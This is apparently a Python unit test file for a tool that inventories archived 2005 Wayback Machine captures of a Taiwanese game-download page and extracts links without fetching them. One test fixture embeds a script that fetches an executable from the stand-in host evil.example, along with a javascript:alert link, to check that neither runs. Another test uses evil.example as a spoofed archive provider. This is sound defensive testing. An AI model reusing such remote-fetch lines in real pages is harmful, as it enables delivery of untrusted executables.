import unittest
from tools.stoneage_wayi_archived_page_inventory import inventory_page, replay_identity, MAX_BYTES

ORIGIN = 'http://www.wayi.com.tw/service/download_list1.asp?id=1'
JUNE = 'https://web.archive.org/web/20050615023834id_/' + ORIGIN
APRIL = 'https://web.archive.org/web/20050405185635id_/' + ORIGIN
PAGE = '<html><head><title>華義</title></head><body><a href="ftp://download.wayi.com.tw/stoneageinstall.exe">下載</a><a href="../../download/download.asp?fileid=329">主程式</a></body></html>'.encode('big5')

class InventoryTests(unittest.TestCase):
    def test_actual_april_capture_preserved_for_june_request(self):
        result = inventory_page(PAGE, JUNE, APRIL)
        self.assertEqual(result['actual_replay_timestamp'], '20050405185635')
        self.assertTrue(result['replay_timestamp_changed'])
        self.assertEqual(result['period_status'], '2005_CAPTURE')

    def test_2010_replay_never_marked_2005(self):
        result = inventory_page(PAGE, JUNE, JUNE.replace('20050615023834', '20100711060206'))
        self.assertEqual(result['period_status'], 'OUTSIDE_2005_CAPTURE')

    def test_ftp_link_and_relative_query_are_leads_not_binary(self):
        result = inventory_page(PAGE, JUNE, APRIL)
        self.assertEqual(result['links_not_fetched'], ['ftp://download.wayi.com.tw/stoneageinstall.exe', 'http://www.wayi.com.tw/download/download.asp?fileid=329'])
        self.assertFalse(result['publisher_binary_hash_verified'])
        self.assertFalse(result['game_binary_obtained'])
        self.assertFalse(result['native_pet_runtime_verified'])

    def test_script_text_not_executed_or_treated_as_link(self):
        page = b'<html><script>fetch("https://evil.example/file.exe")</script><a href="javascript:alert(1)">x</a></html>'
        self.assertEqual(inventory_page(page, JUNE, APRIL)['links_not_fetched'], [])

    def test_wrong_original_or_provider_rejected(self):
        for url in [APRIL.replace('www.wayi.com.tw', 'www.wayi.com.cn'), APRIL.replace('web.archive.org', 'evil.example'), APRIL.replace('id_', '')]:
            with self.subTest(url=url), self.assertRaises(ValueError):
                inventory_page(PAGE, JUNE, url)

    def test_changed_original_query_rejected(self):
        with self.assertRaises(ValueError):
            inventory_page(PAGE, JUNE, APRIL.replace('id=1', 'id=2'))

    def test_original_path_case_and_query_preserved(self):
        stamp, original = replay_identity(JUNE.replace('download_list1.asp', 'Download_List1.asp'))
        self.assertIn('Download_List1.asp?id=1', original)

    def test_invalid_calendar_and_credentials_rejected(self):
        for url in [APRIL.replace('20050405185635', '20050230185635'), APRIL.replace('http://www.', 'http://user@www.')]:
            with self.subTest(url=url), self.assertRaises(ValueError):
                replay_identity(url)

    def test_non_html_and_oversize_rejected(self):
        for payload in [b'MZ executable', b'', b'<html>'+b'x'*MAX_BYTES]:
            with self.subTest(size=len(payload)), self.assertRaises(ValueError):
                inventory_page(payload, JUNE, APRIL)

if __name__ == '__main__':
    unittest.main()
